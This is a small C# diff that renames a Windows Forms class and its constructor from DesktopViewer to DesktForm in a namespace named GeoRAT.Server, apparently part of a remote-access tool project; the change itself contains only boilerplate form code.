@@ -10,9 +10,9 @@ using System.Windows.Forms;
 
 namespace GeoRAT.Server
 {
-    public partial class DesktopViewer : Form
+    public partial class DesktForm : Form
     {
-        public DesktopViewer()
+        public DesktForm()
         {
             InitializeComponent();
         }
